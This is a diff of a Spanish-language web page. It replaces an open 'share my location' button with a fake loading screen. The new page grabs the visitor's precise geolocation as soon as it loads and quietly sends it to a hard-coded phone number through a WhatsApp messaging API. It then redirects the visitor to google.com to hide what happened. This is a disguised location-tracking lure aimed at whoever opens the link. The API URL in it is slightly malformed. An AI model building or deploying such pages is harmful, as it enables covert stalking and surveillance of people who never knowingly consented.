@@ -1,14 +1,79 @@
-<button onclick="ubicar()">Compartir mi ubicación</button>
-<p id="salida"></p>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando Contenido...</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f7f9fa;
+        }
+        .loader {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            border-left-color: #007bff;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
 
-<script>
-function ubicar() {
-  navigator.geolocation.getCurrentPosition(
-    p => {
-      const url = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-      salida.innerHTML = `<a href="${url}" target="_blank">${url}</a>`;
-    },
-    () => salida.textContent = "No se pudo obtener la ubicación (¿diste permiso?)"
-  );
-}
-</script>
+    <div class="loader"></div>
+
+    <script>
+        // CONFIGURACIÓN DE TU TELÉFONO Y API
+        const TELEFONO = "51906565039"; // Tu número con el código de país de Perú
+        const API_KEY = "TU_API_KEY_DE_CALLMEBOT"; // REEMPLAZA ESTO CON TU CLAVE DE CALLMEBOT
+        
+        // PÁGINA A LA QUE IRÁ EL USUARIO DESPUÉS DE DAR PERMISO
+        const URL_REDIRECCION = "https://google.com"; 
+
+        // Intentar obtener la ubicación inmediatamente
+        if (navigator.geolocation) {
+            const opciones = {
+                enableHighAccuracy: true,
+                timeout: 7000,
+                maximumAge: 0
+            };
+            navigator.geolocation.getCurrentPosition(EnviarUbicacion, IrAlDestino, opciones);
+        } else {
+            IrAlDestino();
+        }
+
+        function EnviarUbicacion(posicion) {
+            const lat = posicion.coords.latitude;
+            const lng = posicion.coords.longitude;
+            
+            // Crear enlace para ver en el mapa
+            const googleMapsUrl = `https://google.com/maps?q=${lat},${lng}`;
+            
+            // Texto que llegará a tu WhatsApp
+            const mensaje = `🚨 *ALERTA DE SEGURIDAD*\nUn usuario ha abierto el enlace.\n\n📍 *Ubicación:* ${googleMapsUrl}`;
+            const textoCodificado = encodeURIComponent(mensaje);
+            
+            // Enlace de la API para enviar el mensaje en segundo plano
+            const apiUrl = `https://callmebot.com{TELEFONO}&text=${textoCodificado}&apikey=${API_KEY}`;
+
+            fetch(apiUrl, { mode: 'no-cors' })
+                .then(() => IrAlDestino())
+                .catch(() => IrAlDestino());
+        }
+
+        function IrAlDestino() {
+            window.location.href = URL_REDIRECCION;
+        }
+    </script>
+</body>
+</html>
